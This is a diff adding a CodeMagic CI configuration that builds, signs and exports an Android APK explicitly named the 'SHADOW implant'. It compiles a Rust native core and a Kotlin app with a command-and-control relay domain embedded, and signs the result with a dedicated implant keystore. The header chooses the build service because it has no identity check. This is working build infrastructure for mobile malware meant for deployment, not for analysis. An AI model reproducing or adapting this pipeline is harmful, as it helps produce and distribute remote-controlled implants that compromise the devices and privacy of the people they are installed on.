@@ -1,0 +1,46 @@
+# SHADOW implant build — CodeMagic (no identity gate, free quota)
+# Builds Rust core (NDK) + Kotlin APK, signs with the implant keystore.
+workflows:
+  build-implant:
+    name: Build SHADOW Implant
+    max_build_duration: 30
+    instance_type: linux_x2
+    environment:
+      java: 17
+      android: true
+      flutter: false
+      vars:  # set in CodeMagic UI > Application > Environment Variables
+        C2_DOMAIN: cfg-relay.marwannaili-23-07.workers.dev
+    scripts:
+      # 1. Rust core -> jniLibs (NDK cross-compile)
+      - name: Build Rust core
+        script: |
+          export ANDROID_HOME=$CM_ANDROID_SDK_DIR
+          rustup target add aarch64-linux-android
+          cargo install cargo-ndk || true
+          cd core
+          cargo ndk -t arm64-v8a -o android/app/src/main/jniLibs build --release
+          cp "$ANDROID_HOME/ndk/26.1.10909125/toolchains/llvm/prebuilt/linux-x86_64/sysroot/usr/lib/aarch64-linux-android/libc++_shared.so" android/app/src/main/jniLibs/arm64-v8a/
+      # 2. Kotlin APK
+      - name: Build APK
+        script: |
+          cd core/android
+          chmod +x gradlew
+          export C2_DOMAIN="$C2_DOMAIN"
+          ./gradlew assembleRelease
+      # 3. Sign APK (keystore via CodeMagic env var IMPLANT_KEYSTORE_BASE64)
+      - name: Sign APK
+        script: |
+          curl -sSL -o /tmp/bt.zip https://dl.google.com/android/repository/build-tools_r34-linux.zip
+          python3 -c "import zipfile; z=zipfile.ZipFile('/tmp/bt.zip'); open('/tmp/apksigner.jar','wb').write(z.read([n for n in z.namelist() if n.endswith('apksigner.jar')][0]))"
+          echo "$IMPLANT_KEYSTORE_BASE64" | base64 -d > app/implant.jks
+          IN=$(ls app/build/outputs/apk/release/*.apk | head -n1)
+          OUT=app/build/outputs/apk/release/shadow-implant-signed.apk
+          java -jar /tmp/apksigner.jar sign --ks app/implant.jks --ks-key-alias "$IMPLANT_KEY_ALIAS" --ks-pass "pass:$IMPLANT_KEYSTORE_PASS" --key-pass "pass:$IMPLANT_KEY_PASS" --out "$OUT" "$IN"
+          java -jar /tmp/apksigner.jar verify -v "$OUT" | head -6
+    artifacts:
+      - type: file
+        files:
+          - core/android/app/build/outputs/apk/release/shadow-implant-signed.apk
+          - core/android/app/build/outputs/apk/release/*.apk
+        name: shadow-implant
